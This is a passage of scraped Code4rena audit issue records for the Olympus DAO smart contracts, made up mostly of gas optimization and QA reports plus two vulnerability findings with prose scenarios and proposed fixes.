https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L550 (10000 and 100)   **Description:**  Use constant variables to make the code easier to understand and maintain.  **Recommendation:**  Define constants instead of unknown variables.   ### [N-02]: Public function can be external ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L47  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L20  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L110  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L215  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L108  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L22  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28    **Description:**  Public functions can be declared external if they are not called by the contract.  **Recommendation:**  Declare these functions as external instead of public. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/385", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "# Report ## Gas Optimizations ##  ### [G-01]: Use new variable instead of reading array length in every loop of a for-loop ### **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278   **Description:**  If you read the length of the array at each iteration of the loop, this consumes a lot of gas.   **Recommendation:**  Store the array\u2019s length in a variable before the for-loop, and use this new variable in the loop.   ### [G-02]: variable can be immutable ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32   **Description:**  Variable is set in the constructor and never modified after that.  **Recommendation:**  It is more gas efficient to mark it as immutable.   ### [G-03]: X += Y costs more gas than X = X + Y ### **Context: **   + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252  + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254    + https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194  **Recommendation:**  Change X += Y (X -= Y) to X = X + Y (X = X - Y).   ### [G-04]: i++ costs more gas than ++i ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691   **Recommendation:**  Change i++ (i--) to ++i (--i).  ### [G-05]: Don't initialize variable with its default value ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58  **Description:**  Default value of uint is 0. It's unnecessary and costs more gas to initialize uint variavles to 0.  **Recommendation:**  Change uint256 i = 0; to uint256 i;   ### [G-06]: >0 costs more gas than !=0 ### **Context:**   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247  **Description:**  uint256 is a unsigned integer.   userVotesForProposal[activeProposal.proposalId][msg.sender] will never be less than 0.  **Recommendation:**  Change to  ``` if (userVotesForProposal[activeProposal.proposalId][msg.sender] != 0) { ```"}, {"title": "Heart will stop if all rewards are swept", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/378", "labels": ["bug", "2 (Med Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115   # Vulnerability details  Rewards for Heart `beat` are sent via `_issueReward`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115  ```solidity      function _issueReward(address to_) internal {         rewardToken.safeTransfer(to_, reward);         emit RewardIssued(to_, reward);     }  ```  The function doesn't check for available tokens e.g. `min(reward, rewardToken.balanceOf(address(this)));`   In case of calling `withdrawUnspentRewards`  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152  ```solidity     /// @inheritdoc IHeart     function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {         token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));     } ```  Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.  While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.  ## Remediation  Add a check for available tokens `min(reward, rewardToken.balanceOf(address(this)));`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/377", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Executive Summary  Codebase is gas conscious and basic gas saving advice is followed pretty thoroughly, below are listed a few extra optimizations, sorted by efficacy  ## Optimized `updateMovingAverage` - 200+ gas saved per function call  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L133-L145  ```solidity          // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         }          // Push new observation into storage and store timestamp taken at         observations[nextObsIndex] = currentPrice;         lastObservationTime = uint48(block.timestamp);         nextObsIndex = (nextObsIndex + 1) % numObs;  ```  Can be changed to  ```solidity          // Calculate new moving average          /// @audit Use unchecked as you already checked for overflow         unchecked {           if (currentPrice > earliestPrice) {               _movingAverage += (currentPrice - earliestPrice) / numObs;           } else {               _movingAverage -= (earliestPrice - currentPrice) / numObs;           }            // Push new observation into storage and store timestamp taken at           /// @audit also unchecked addition           /// @audit Cache the value of `nextObsIndex` to save an SLOAD           uint32 cachedNextObsIndex = nextObsIndex;           observations[cachedNextObsIndex] = currentPrice;           lastObservationTime = uint48(block.timestamp);           nextObsIndex = (cachedNextObsIndex + 1) % numObs;         }  ```  ## Avoidable Second STATICCALL - 100+ gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L238-L239  ```solidity             ensureValidKeycode(Module(target_).KEYCODE());  ```  Can instead cache keycode = Module(target_).KEYCODE(); and pass it to the next function `_installModule(target_, keycode);  Saving over 100 gas (STATICCALL + cost of processing the string for the return value)  ## Cache Storage Var - Save 100 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L165-L166  ```solidity             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))  ```  Cache the value of `observationFrequency` to save 100 gas  ## Free Unchecked - 80+ gas  You can wrap the code below in unchecked to gain around 80 gas;  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L44-L45  ```solidity         uint256 instructionsId = ++totalInstructions;  ```   # Usual Suspects  ## Cache length - 3 gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L279  ```solidity         for (uint256 step; step < instructions.length; ) {  ```"}, {"title": "In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/376", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221 https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304   # Vulnerability details  ## Impact Currently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.  And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.  But `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.   ## Proof of Concept The below scenario would be possible. 1. `Proposal 1` was submitted and activated successfully. 2. Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%` 3. This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`. 4. Currently the contract contains more than 81% of total votes and users have at most 19% in total. 5. Also users can't reclaim their votes among 81% while `Proposal 1` is active. 6. So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221). 7. So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.  I am not sure we can use the current `GRACE_PERIOD` for that purpose.  So `reclaimVotes()` should be modified like below.  ``` function reclaimVotes(uint256 proposalId_) external {     uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];      if (userVotes == 0) {         revert CannotReclaimZeroVotes();     }      if (proposalId_ == activeProposal.proposalId) {         if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++         {             revert CannotReclaimTokensForActiveVote();         }     }      if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {         revert VotingTokensAlreadyReclaimed();     }      tokenClaimsForProposal[proposalId_][msg.sender] = true;      VOTES.transferFrom(address(this), msg.sender, userVotes); } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/374", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "# Executive Summary  The idea of Modules and Policies is brilliant!  Most of the codebase is well written and well thought out, the one exception to me was Governance which I don't believe will withstand an adversarial environment.  Minor Code smells are listed below rated via the following standard  ## Legend:  - L -> Low Severity -> Could cause issues however impact / probability is limited - R -> Refactoring -> Suggested Code Change to improve readability and maintainability or to offer better User Experience - NC -> Non-Critical / Informational -> No risk of loss, pertains to events or has no impact  ## L - Burning `VOTES` from Governance will break accounting  While burning `VOTES` from the `Governance` contract is questionable, the code has no check to prevent that.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L38-L42  ```solidity      function burnFrom(address wallet_, uint256 amount_) external permissioned {         _burn(wallet_, amount_);     }  ```  Because `Governance` and `VOTES.transferFrom` relies on a \"use -> refund\" pattern, losing even 1 wei of token will cause `reclaimVotes` to revert, effectively denying a user from being able to vote again.  Voting can be denied by simply burning their `VOTES` hence why I set the severity to Low as this is a Ban with extra steps as the `voter_admin` can just burn the votes from the user  ## L - Allow others to repay the debt  `repayLoan` allows only the caller to repay their own debt, this can create situations in which insolvency or a smart contract bug prevent from making the TRSRY whole.  A straightforward solution would be to allow anyone to repay the loan on behalf of a specific address  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L103-L110  ```solidity      /// @notice Lets an address with debt repay their loan.     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_); ```   By allowing other addresses a softer approach to repaying debt can be achieved.  This avoids having to manually reset the debt.   ## L - `_activatePolicy` is non CEI conformant  The function `_activatePolicy` will perform an external call to `policy_.configureDependencies()` and then it will change storage.  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L298-L315  ```solidity         // Add policy to list of active policies         activePolicies.push(policy_);         getPolicyIndex[policy_] = activePolicies.length - 1;          // Record module dependencies         Keycode[] memory dependencies = policy_.configureDependencies();         uint256 depLength = dependencies.length;          for (uint256 i; i < depLength; ) {             Keycode keycode = dependencies[i];              moduleDependents[keycode].push(policy_);             getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1;              unchecked {                 ++i;             }         } ```  I wasn't able to find any exploit as the function is privileged  ## R - `get` for a state changing function  `getXyz` is typically used for retrieving values from view functions, however in the case of `TRSRY` the function is used to receive a loan.  Because the codebase already uses `get` for view functions, I'd recommend renaming the function below to `receiveLoan` or just `loan` to keep the coding convention  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L92-L93  ```solidity     function getLoan(ERC20 token_, uint256 amount_) external permissioned {  ```   ## R - Can check contract existence without assembly  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L31-L37  ```solidity function ensureContract(address target_) view {     uint256 size;     assembly {         size := extcodesize(target_)     }     if (size == 0) revert TargetNotAContract(target_); } ```  Can be changed to ```solidity target_.code.length ```   ## Lack of Address(0) Zero-Checks  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L66-L67  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78   ## NC - Lack of event for setters  Throughout the codebase, most setters emit events, however `setActiveStatus` doesn't  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L127-L128  ```solidity         isActive = activate_;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L77-L78  ## NC - Events not emitted in constructor  While setters emit events, the constructor doesn't, this may cause issues with tracking, e.g. theGraph as an event is for the initial setting is not emitted   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L217-L220  ```solidity     constructor() {         executor = msg.sender;         admin = msg.sender;     } ```  ## NC - Gibberish action will still emit an event  You may instead want to emit only when a valid action is executed Or add a comment to the function mentioning that  As it stands the code will emit even if the action data is not recognized  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L259-L260  ```solidity         emit ActionExecuted(action_, target_);  ```"}, {"title": "Missing checks in `Kernel._deactivatePolicy`", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/368", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325   # Vulnerability details  ## Impact There are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.   ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325  ## Recommended Mitigation Steps Adding `require(activePolicies[idx] == policy_, \"Unregistered policy\");` will prevent this, where `idx = getPolicyIndex[policy_]`.  **NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor. "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " ## 1. Inline a modifier that\u2019s only used once ### Description As onlyGovernor() is only used once in this contract (in function executeAction()), it should get inlined to save gas:  ### Instances //Links to github files: [Kernel.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L223)    *Actual codes used*   ``` src/Kernel.sol:223:    modifier onlyExecutor() { ```  ### Instances where modifiers are used only once //Links to github files: [Kernel.sol:L235](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L235)   *Actual codes used* ``` src/Kernel.sol:235:    function executeAction(Actions action_, address target_) external onlyExecutor { ``` ----  ## 2.++I COSTS LESS GAS COMPARED TO I++ OR I += 1 ### Description *Pre-increments and pre-decrements are cheaper.*  For a `uint256` i variable, the following is true with the Optimizer enabled at 10k: Increment: `i += 1` is the most expensive form `i++` costs `6` `gas` less than `i += 1` `++i` costs `5 gas` less than `i++` (11 gas less than i += 1)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name post-increment: ### Instances // Links to Github file [Operator.sol:L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) [Operator.sol:L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) [Operator.sol:L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) [KernelUtils.sol:L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) [KernelUtils.sol:L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)   *Actual codes used* ``` src/policies/Operator.sol:488:            decimals++; src/policies/Operator.sol:670:                _status.low.count++; src/policies/Operator.sol:686:                _status.high.count++; src/utils/KernelUtils.sol:49:            i++; src/utils/KernelUtils.sol:64:            i++; ```  ---- ## 3.`<ARRAY>.LENGTH` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP ### Description The overheads outlined below are `PER LOOP`, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use `MLOAD` (3 gas) calldata arrays use `CALLDATALOAD` (3 gas) Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset ### Instances // Links to github files [Governance.sol:L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)   *Actual codes used* ``` src/policies/Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  ---- ## 4. Comparisons: Boolean comparisons ### Description Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true) and if(!directValue) instead of if(directValue == false)  ### Instances //Links to github files: [Governance.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223) [Governance.sol:L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   *Actual codes used* ``` src/policies/Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { src/policies/Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ----  ## 5. IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for `(uint256 i = 0; i < numIterations; ++i)` { should be replaced with for `(uint256 i; i < numIterations; ++i) {`  ### Instances // Links to gihthub file   [Kernel.sol:L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397) [KernelUtils.sol:L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43) [KernelUtils.sol:L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58)  *Actual codes used* ``` src/Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ```  ---- ## 6. Strict inequalities (>) are more expensive than non-strict ones (>=)  Strict inequalities (>) are more expensive than non-strict ones (>=). This is due to some supplementary checks (ISZERO, 3 gas. I suggest using >= instead of > to avoid some opcodes here:  ### Instances: [RANGE.sol:L245](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245) [RANGE.sol:L247](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247) [RANGE.sol:L249](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L249) [Operator.sol:L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L115) [Operator.sol:L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L254) [Operator.sol:L262](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L262) ``` src/modules/RANGE.sol:245:            wallSpread_ > 10000 || src/modules/RANGE.sol:247:            cushionSpread_ > 10000 || src/modules/RANGE.sol:249:            cushionSpread_ > wallSpread_ src/policies/Operator.sol:115:            configParams[6] > configParams[7] || src/policies/Operator.sol:254:                    currentPrice < range.cushion.high.price || currentPrice > range.wall.high.price src/policies/Operator.sol:262:                    currentPrice > range.cushion.high.price && currentPrice < range.wall.high.price ``` ### References:  [https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than](https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than)   ---- ## 7. Use a more recent version of solidity ### Description Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ### Instances: //Links to github files: [IBondCallback.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol#L2) [IOperator.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L2) [IHeart.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol#L2)   *Actual codes used* ```  src/interfaces/IBondCallback.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IOperator.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IHeart.sol:2:pragma solidity >=0.8.0; ``` ---- ## 8. Bytes constants are more efficient than string constants ### Descriptions From the Solidity doc:  If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.  Why do Solidity examples use bytes32 type instead of string?  bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can\u2019t be returned from a function to a contract).  If data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.  Instances of string constant that can be replaced by bytes(1..32) constant : ### Instances: //Links to github files: [Governance.sol:L41](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L41) [Governance.sol:L162](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162)   *Actual codes used* ``` src/policies/Governance.sol:41:    string proposalURI; src/policies/Governance.sol:162:        string memory proposalURI_ ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/359", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "### Array length should not be looked up in every iteration of a `for` loop Since calculating the array length costs gas, it's best to read the length of the array from memory before executing the loop. ___ [Governance.sol: L278-283](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L283) ```solidity         for (uint256 step; step < instructions.length; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` Suggestion: ```solidity         uint256 instructLength = instructions.length;         for (uint256 step; step < instructLength; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` ___ ___   ### Use `++i` instead of `i++` to increase count in a `for` loop Since use of  `i++` (or equivalent counter) costs more gas, it is better to use `++i` ___ [KernelUtils.sol: L43-51](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43-L51) ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             i++;         }     } ``` Suggestion: ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             ++i;         }     } ``` ___ Similarly for the following `for` loop:  [KernelUtils.sol: L58-66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58-L66) ___ ___"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/354", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Gas Optimizations Report for Olympus DAO contest  ## Overview During the audit, 6 gas issues were found.  \u2116 | Title | Instance Count --- | --- | ---  G-1 | [Postfix increment and decrement](#g-1-postfix-increment-and-decrement) | 5 G-2 | [<>.length in loops](#g-2-length-in-loops) | 1 G-3 | [Initializing variables with default value](#g-3-initializing-variables-with-default-value) | 3 G-4 | [Some variables can be immutable](#g-4-some-variables-can-be-immutable) | 1 G-5 | [> 0 is more expensive than =! 0](#g-5--0-is--more-expensive-than--0) | 1 G-6 | [x += y is more expensive than x = x + y](#g-6-x--y-is--more-expensive-than-x--x--y) | 18  ## Gas Optimizations Findings (6) ### G-1. Postfix increment and decrement ##### Description Prefix increment and decrement cost less gas than postfix.  ##### Instances - [```decimals++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488) - [```_status.low.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670) - [```_status.high.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686) - [```_status.low.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L675) - [```_status.high.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691)  ##### Recommendation Consider using prefix increment and decrement  where it is relevant.   # ### G-2. <>.length in loops ##### Description Reading the length of an array at each iteration of the loop consumes extra gas.  ##### Instances [```for (uint256 step; step < instructions.length; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  ##### Recommendation Store the length of an array in a variable before the loop, and use it.  # ### G-3. Initializing variables with default value ##### Description It costs gas to initialize integer variables with 0 or bool variables with false but it is not necessary.  ##### Instances - [```for (uint256 i = 0; i < reqLength; ) 